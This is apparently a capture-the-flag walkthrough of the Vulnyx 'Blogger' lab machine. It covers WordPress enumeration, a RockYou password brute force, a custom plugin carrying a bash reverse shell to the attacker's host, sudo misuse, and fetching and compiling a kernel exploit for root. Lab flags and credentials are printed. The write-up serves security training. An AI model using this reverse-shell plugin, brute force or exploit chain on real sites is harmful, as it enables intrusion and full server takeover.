# Vulnyx – Blogger Lab



<img width="1342" height="416" alt="Screenshot 2026-10-31 120210" src="https://github.com/user-attachments/assets/57e2149e-810a-455b-82d8-66cdf7eb78ec" />


## Table of Contents

1. [Introduction](#1-introduction)
2. [Reconnaissance and Enumeration](#2-reconnaissance-and-enumeration)
3. [WordPress Enumeration](#3-wordpress-enumeration)
4. [Password Discovery](#4-password-discovery)
5. [Initial Access – WordPress to www-data](#5-initial-access--wordpress-to-www-data)
6. [Lateral Movement – www-data to blog](#6-lateral-movement--www-data-to-blog)
7. [Privilege Escalation – blog to root](#7-privilege-escalation--blog-to-root)
8. [Retrieving the Flags](#8-retrieving-the-flags)
9. [Attack Path Summary](#9-attack-path-summary)
10. [Tools Used](#10-tools-used)
11. [Lab Summary](#11-lab-summary)



## 1. Introduction

This writeup documents my penetration testing walkthrough of the **Blogger** machine from Vulnyx.

The objective was to identify exposed services, enumerate the WordPress installation, gain initial access, perform lateral movement, and escalate privileges to obtain root access.

**Target Information**

| Detail | Information |
|---|---|
| Platform | Vulnyx |
| Machine | Blogger |
| Target IP | `192.168.1.117` |


---

## 2. Reconnaissance and Enumeration

### Step 1: Initial Nmap Scan

I started with an Nmap scan to identify open ports, running services, service versions, and the target operating system.

```bash
nmap -sS -p- -sV -O --open --min-rate 5000 -n -oN scan 192.168.1.117
```
Output:
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 08:30 -0400
Nmap scan report for 192.168.1.117
Host is up (0.0014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
MAC Address: 00:0C:29:10:08:35 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds
```
**Important Findings:**

- Port 22 – OpenSSH 8.4p1
- Port 80 – Apache HTTP Server 2.4.56
- Operating System – Linux
- Network distance – 1 hop

The initial scan did not reveal an obvious entry point, so I continued with vulnerability scanning and web enumeration.

### Step 2: Vulnerability Scanning

Next, I used Nmap's vulnerability scripts to check for known vulnerabilities and gather additional information about the services.

```bash
# Detect service versions and run available vulnerability detection scripts
nmap -sV --script vuln 192.168.1.117
```

The scan returned several entries from the Vulners database revealing that both OpenSSH and Apache are highly vulnerable to Remote Code Execution (RCE).

It also discovered a WordPress installation at:

```text
http://192.168.1.117/wordpress/
```

**Important observation:** Vulnerability scanner results are potential matches based on detected software versions. They do not automatically confirm that a particular vulnerability is exploitable on the target.

I browsed to the IP address of target machine with /wordpress in browser url and it gave this output:
<img width="1718" height="998" alt="Screenshot_2026-10-29_09_10_36" src="https://github.com/user-attachments/assets/05b7df28-f7aa-43d6-be07-3c562a430326" />

---

## 3. WordPress Enumeration

### Step 3: Passive WPScan Enumeration

Since Nmap discovered WordPress, I used WPScan (a dedicated WordPress vulnerability scanner) to enumerate users, vulnerable plugins, and themes.

```bash

wpscan --url http://192.168.1.117/wordpress --detection-mode passive --enumerate u
```

Output:
```text______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.1.0
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________

[+] URL: http://192.168.1.117/wordpress/ [192.168.1.117]
[+] Started: Thu Oct 29 08:54:49 2026
[+] Command Line: wpscan --url http://192.168.1.117/wordpress --detection-mode passive --enumerate u
[+] Hostname: kali

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.56 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress version 6.3 identified (Insecure, released on 2023-08-08).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.117/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.117/wordpress/, Match: 'WordPress 6.3'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive Methods)
[i] No Users Found.
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
[+] Finished: Thu Oct 29 08:54:51 2026
[+] Requests Done: 1
[+] Cached Requests: 7
[+] Most response codes received: 404: 1
[+] Data Sent: 222 B
[+] Data Received: 436 B
[+] Memory used: 170.848 MB
[+] Elapsed time: 00:00:01
```

**Findings:

- WordPress version: 6.3
- Web server: Apache 2.4.56
- No usernames discovered through passive enumeration.
- No WPScan API token was provided, so vulnerability database results were unavailable.

The passive scan confirmed that the target was running WordPress 6.3.

### Step 4: Aggressive WPScan Enumeration

Since passive enumeration did not identify any users, I performed aggressive detection.

```bash
wpscan --url http://192.168.1.117/wordpress --detection-mode aggressive --enumerate u
```
Output:
```text
wpscan --url http://192.168.1.117/wordpress --detection-mode aggressive --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.1.0
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________

[+] URL: http://192.168.1.117/wordpress/ [192.168.1.117]
[+] Started: Thu Oct 29 08:58:33 2026
[+] Command Line: wpscan --url http://192.168.1.117/wordpress --detection-mode aggressive --enumerate u
[+] Hostname: kali

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://192.168.1.117/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.1.117/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.117/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.3 identified (Insecure, released on 2023-08-08).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://192.168.1.117/wordpress/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="6.3">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://192.168.1.117/wordpress/wp-admin/load-styles.php, Match: '6.3'

[i] The main theme could not be detected.

[+] Enumerating Users (via Aggressive Methods)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================> (10 / 10) 100.00% Time: 00:00:00
[i] 1 user(s) Identified.
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
[+] Finished: Thu Oct 29 08:58:38 2026
[+] Requests Done: 47
[+] Cached Requests: 10
[+] Most response codes received: 404: 30, 200: 14, 302: 2, 403: 1
[+] Data Sent: 12.531 KB
[+] Data Received: 79.363 KB
[+] Memory used: 152.301 MB
[+] Elapsed time: 00:00:05
```

**Important Findings:**

- WordPress version: 6.3
- XML-RPC enabled: `/wordpress/xmlrpc.php`
- WordPress readme file exposed.
- WP-Cron endpoint discovered.
- Username identified: `peter`

The aggressive scan successfully identified the username `peter`.

It also revealed that XML-RPC was enabled (/wordpress/xmlrpc.php).

Hence we can bruteforce "peter" user's password becuase XML-RPC lets you bundle hundreds of password guesses into a single HTTP request, completely bypassing basic rate limits.

we can use metasploit for bruteforce but i'm using wpscan itself.

---

## 4. Password Discovery

### Step 5: WordPress Password Testing

With the username identified, I used WPScan to test the account against the RockYou password wordlist in this authorized lab.

```bash
# Test the identified WordPress username against passwords
# from the RockYou wordlist
wpscan --url http://192.168.1.117/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames peter
```
Output:
```text
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.1.0
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________

[+] URL: http://192.168.1.117/wordpress/ [192.168.1.117]
[+] Started: Thu Oct 29 09:04:33 2026
[+] Command Line: wpscan --url http://192.168.1.117/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames peter
[+] Hostname: kali

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.56 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.117/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.1.117/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.117/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.3 identified (Insecure, released on 2023-08-08).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.117/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.117/wordpress/, Match: 'WordPress 6.3'

[i] The main theme could not be detected.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - peter / peterpan                                                                                                                
Trying peter / joseluis Time: 00:00:35 <==============================================================> (1055 / 1055) 100.00% Time: 00:00:35

[!] Valid Combinations Found:
 | Username: peter, Password: peterpan

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
[+] Finished: Thu Oct 29 09:05:15 2026
[+] Requests Done: 1082
[+] Cached Requests: 4
[+] Most response codes received: 200: 1067, 404: 11, 302: 3, 403: 1
[+] Data Sent: 383.465 KB
[+] Data Received: 6.925 MB
[+] Memory used: 171.312 MB
[+] Elapsed time: 00:00:42
```

<text>Successful Result:</text>

```text
[SUCCESS] - peter / peterpan

Valid Combinations Found:
Username: peter
Password: peterpan
```

The scan identified the following valid credentials:

| Field | Value |
|---|---|
| Username | `peter` |
| Password | `peterpan` |

### Step 6: Accessing the WordPress Login Page

Initially, accessing the XML-RPC endpoint did not provide a login page.

<img width="1718" height="998" alt="Screenshot_2026-10-29_09_10_27" src="https://github.com/user-attachments/assets/a73931a0-721a-4a44-b5d0-6d509c256def" />


We got no login page to test the credentials.
After research , i got to know there is a standard, default login gateway hardcoded into every WordPress installation across the globe i.e "wp-login.php"

```text
http://192.168.1.117/wordpress/wp-login.php
```
When opened in browser, we got a login page:

<img width="1718" height="998" alt="Screenshot_2026-10-29_09_18_51" src="https://github.com/user-attachments/assets/2bb98a57-85ee-4271-bf15-077b8da40cb2" />


However, the login page did not render correctly when I tried to use the discovered credentials.

<img width="1718" height="998" alt="Screenshot_2026-10-29_09_20_48" src="https://github.com/user-attachments/assets/9822a8e7-5abf-4bf6-97cd-b4950350a5fa" />

### Step 7: Updating the Local Hosts File

After investigating the issue, I found that the website was redirecting to the domain `megablog.nyx`.

To resolve this domain locally, I Added "192.168.1.117 megablog.nyx" to the local /etc/hosts file on the my(attacker) machine to resolve the domain name redirect and fix broken site rendering. and we got the wordpress login page.

```bash
sudo nano /etc/hosts
```

I added the following entry:

```text
192.168.1.117 megablog.nyx
```

This mapped the target IP address to the required domain name on my Kali machine.

After saving the file, I accessed the website using its domain name and the WordPress login page rendered correctly.

I entered the discovered credentials and completed the email verification step presented by the lab.

<img width="1718" height="998" alt="Screenshot_2026-10-29_09_35_23" src="https://github.com/user-attachments/assets/463add6d-be9b-44da-ae89-1b4da98f1f13" />


**Result:** Successfully accessed the WordPress Dashboard with administrative privileges.

---

## 5. Initial Access – WordPress to www-data

### Step 8: Identifying the Active WordPress Theme

After logging into the dashboard, I checked the **At a Glance** section.

The website was using the **Twenty Twenty-One** theme.

Since the account had administrative privileges, I investigated whether server-side code execution could be achieved through the WordPress theme or plugin functionality.

### Step 9: Starting a Netcat Listener

Before attempting to establish a reverse shell, I started a Netcat listener on my Kali machine.

```bash
# Listen for an incoming reverse shell connection on TCP port 4444
nc -lvnp 4444
```

### Step 10: Testing the Theme File Editor

I first attempted to inject a reverse shell payload through the WordPress Theme File Editor.

```php
<?php
// Execute Bash and connect back to the attacker's machine
exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_KALI_IP>/4444 0>&1'");
?>
```

However, WordPress blocked the direct theme modification attempt and returned a loopback communication error.

Therefore, I moved to another approach using a custom plugin.

### Step 11: Creating a Custom WordPress Plugin

I created a standalone PHP file named `shell-plugin.php` containing the required WordPress plugin headers and the reverse shell code.

```php
<?php
/**
 * Plugin Name: Lab Reverse Shell
 * Version: 1.0
 * Author: Pentester
 * Description: Custom plugin created for the authorized lab.
 */

// Execute the reverse shell and connect to the attacker's listener
exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_KALI_IP>/4444 0>&1'");
?>
```

I compressed the PHP file into a ZIP archive named `shell-plugin.zip`.

Using the WordPress Dashboard, I uploaded the plugin through the plugin upload functionality and activated it.

Plugin activation caused the PHP code to execute on the server, resulting in a reverse shell connection to my Netcat listener.

**Result:** Successfully obtained a shell as `www-data`.

I verified the current user using:

```bash
# Display the current user's UID, GID, and group memberships
id
```

**Output:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 6. Lateral Movement – www-data to blog

### Step 12: Enumerating the Home Directory

After obtaining the initial shell, I checked the `/home` directory to identify local user accounts.

```bash
# List files, directories, permissions, and ownership under /home
ls -la /home
```

**Output:**

```text
drwx------ 2 blog blog 4096 Dec 20 2024 blog
```

This revealed a user account named `blog`.

### Step 13: Checking Sudo Permissions

Next, I checked which commands the current `www-data` user could execute through sudo.

```bash
# Display the sudo permissions available to the current user
sudo -l
```

**Output:**

```text
User www-data may run the following commands on blogger:
    (blog) NOPASSWD: /usr/bin/dash
```

This revealed an important sudo misconfiguration.

The `www-data` account could execute `/usr/bin/dash` as the `blog` user without entering a password.

### Step 14: Switching to the blog User

I used the permitted command to obtain a shell as `blog`.

```bash
# Execute the Dash shell with the privileges of the blog user
sudo -u blog /usr/bin/dash
```

I verified the account change:

```bash
# Display the current username and user/group IDs
whoami && id
```

**Output:**

```text
blog
uid=1000(blog) gid=1000(blog) groups=1000(blog)
```

Successfully moved from `www-data` to `blog`.

### Step 15: Retrieving the User Flag

I navigated to the `blog` user's home directory and listed its contents.

```bash
# Move to the blog user's home directory
cd /home/blog

# List the available files
ls
```

The directory contained:

```text
user.txt
```

I read the user flag:

```bash
# Display the contents of the user flag file
cat user.txt
```

**User Flag:**

```text
507ed5c488064e5ae9d2007dd2b50b53
```

<badge color="success">User flag obtained.</badge>

---

## 7. Privilege Escalation – blog to root

### Step 16: Upgrading the Shell to an Interactive TTY

The initial Netcat shell was not fully interactive. This caused problems when running certain commands, including sudo-related commands.

I upgraded the shell using Python.

```bash
# Spawn an interactive Bash shell using Python's pseudo-terminal module
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then I pressed `CTRL + Z` and executed the following commands on my Kali terminal:

```bash
# Enable raw terminal mode and disable local echo
stty raw -echo

# Resume the suspended reverse shell in the foreground
fg

# Reinitialize the terminal
reset

# Set the terminal type
export TERM=xterm
```

This provided a more interactive terminal session.

### Step 17: Checking for Configuration Credentials

I attempted to inspect the WordPress configuration file to identify possible database credentials.

```bash
# Search the WordPress configuration file for database username and password settings
cat /var/www/html/wordpress/wp-config.php | grep -E 'DB_USER|DB_PASSWORD'
```

However, access was denied:

```text
cat: /var/www/html/wordpress/wp-config.php: Permission denied
```

The `blog` user did not have permission to read the web application's configuration file.

### Step 18: Enumerating the System

I checked the contents and permissions of the `blog` user's home directory.

```bash
# Display hidden files, permissions, ownership, and directory contents
ls -la /home/blog
```
output:
```text
blog@blogger:~$ ls -la /home/blog
total 24
drwx------ 2 blog blog 4096 Dec 20  2024 .
drwxr-xr-x 3 root root 4096 Dec 20  2024 ..
lrwxrwxrwx 1 root root    9 Apr 23  2023 .bash_history -> /dev/null
-rw------- 1 blog blog  220 Jan 15  2023 .bash_logout
-rw------- 1 blog blog 3526 Jan 15  2023 .bashrc
-rw------- 1 blog blog  807 Jan 15  2023 .profile
-r-------- 1 blog blog   33 Dec 20  2024 user.txt
```
We got nothing unusual here. Just few files , including ".bash_history" which is linked to /dev/null. So nothing inside it.

I also checked the kernel and operating system information.

```bash
# Display Linux kernel details and Debian operating system information
uname -a && cat /etc/os-release
```
Output:
```text
Linux blogger 5.10.0-24-amd64 #1 SMP Debian 5.10.179-5 (2023-08-08) x86_64 GNU/Linux
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

**Important Findings:**

- Operating System: Debian GNU/Linux 11 (Bullseye)
- Kernel: Linux 5.10.0-24-amd64
- Architecture: x86_64

These details helped identify potential local privilege escalation paths.

### Step 19: Running LinPEAS

Instead of manually checking every possible privilege escalation path, I used LinPEAS tool to automate local system enumeration.

On my Kali machine, I downloaded LinPEAS and started a temporary HTTP server.

```bash
# Download the LinPEAS enumeration script
wget https://github.com/peass-ng/PEASS-ng/releases/download/20261029-a596a9f3/linpeas.sh

# Start a temporary HTTP server on port 8000
python3 -m http.server 8000
```

In the target's interactive shell, I moved to `/tmp` and downloaded the script from my Kali machine.

```bash
# Move to the temporary directory
cd /tmp

# Download LinPEAS from the attacker's HTTP server
wget http://192.168.1.4:8000/linpeas.sh
```

I then executed LinPEAS:

```bash
# Run the local privilege escalation enumeration script
bash linpeas.sh
```

Output:

<img width="1718" height="998" alt="Screenshot_2026-10-31_01_41_35" src="https://github.com/user-attachments/assets/719f2d3c-e492-45d1-9bc4-d86518f5d330" />

<img width="1718" height="998" alt="Screenshot_2026-10-31_01_41_42" src="https://github.com/user-attachments/assets/9a252810-b60a-4beb-8dc3-9ae790fdaa00" />


The scan highlighted a potential kernel-based privilege escalation issue.

**Finding:** It explicitly flags that this machine is LIKELY VULNERABLE to "Dirty rag (CVE-2026-43284 / CVE-2026-43500).


### Step 20: Investigating the Kernel Exploit

"Dirty Frag" is a critical Local Privilege Escalation (LPE) flaw that affects multiple Linux distributions. Because kernel build predates the official patches and unprivileged user namespaces are enabled, any local user can trigger this flaw to completely escape standard permissions and drop an instant "root" shell.

"Dirty Frag" is a highly recent 2026 kernel exploit chain, meaning it hasn't been added to standard offline exploit-db databases yet. but there is a "exploit" of it in github. 

On my Kali machine, I cloned the exploit repository and compiled the source code.

```bash
# Clone the Dirty Frag exploit repository
git clone https://github.com/V4bel/dirtyfrag.git

# Enter the downloaded repository
cd dirtyfrag

# Compile exp.c into a statically linked executable
gcc -O2 exp.c -o exp_static -lutil -static

# Start an HTTP server to transfer the compiled binary
python3 -m http.server 8000
```

In the target's interactive shell, I downloaded the compiled executable.

```bash
# Move to the temporary directory
cd /tmp

# Download the compiled exploit from the Kali machine
wget http://192.168.1.4:8000/exp_static

# Give the executable permission to run
chmod +x exp_static
```

The original lab notes show that the exploit was executed and returned a root shell.


### Step 21: Verifying Root Access

After obtaining the elevated shell, I checked the current user and privileges.

```bash
# Verify the current username and user/group IDs
whoami && id
```

**Output:**

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

<badge color="success">Root access obtained</badge>

### Step 22: Retrieving the Root Flag

After confirming root access, I navigated to the root user's home directory.

```bash
# Move to the root user's home directory
cd /root

# Read the root flag
cat root.txt
```

**Root Flag:**

```text
1a1096b5c68cbefc74290f70d7ccb696
```

Successfully obtained the root flag and completed the Blogger machine.


## 8. Retrieving the Flags

Both flags were successfully retrieved during the lab.

| Flag | File | Result |
|---|---|---|
| User flag | `/home/blog/user.txt` | `507ed5c488064e5ae9d2007dd2b50b53` |
| Root flag | `/root/root.txt` | `1a1096b5c68cbefc74290f70d7ccb696` |

---

---

## 9. Attack Path Summary

```text
Nmap Scanning
      |
      v
WordPress Discovery
      |
      v
WPScan Enumeration
      |
      v
Username Discovery: peter
      |
      v
Password Discovery: peterpan
      |
      v
WordPress Admin Dashboard
      |
      v
Custom Plugin Upload
      |
      v
Initial Shell: www-data
      |
      v
Sudo Misconfiguration
      |
      v
User: blog
      |
      v
User Flag Retrieved
      |
      v
LinPEAS Enumeration
      |
      v
Kernel Exploit Investigation
      |
      v
Root Access
      |
      v
Root Flag Retrieved
```

## 10. Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port scanning and service enumeration |
| WPScan | WordPress enumeration and password testing |
| RockYou | Password wordlist |
| Netcat | Reverse shell listener |
| Python | Shell upgrade and HTTP file transfer |
| LinPEAS | Linux privilege escalation enumeration |
| Git | Downloading the exploit repository |
| GCC | Compiling the exploit source code |
| Linux utilities | System enumeration and flag retrieval |

## 11. Lab Summary

- Performing full-port scanning and service enumeration using Nmap.
- Identifying WordPress installations and gathering CMS information.
- Enumerating WordPress usernames using WPScan.
- Understanding the security risks of weak passwords and exposed XML-RPC functionality.
- Understanding WordPress administrative access and plugin security.
- Establishing and handling reverse shell connections.
- Identifying insecure sudo permissions and switching between local users.
- Upgrading a basic reverse shell to an interactive TTY.
- Using LinPEAS to identify potential Linux privilege escalation paths.
- Understanding the importance of kernel version checks and exploit verification.

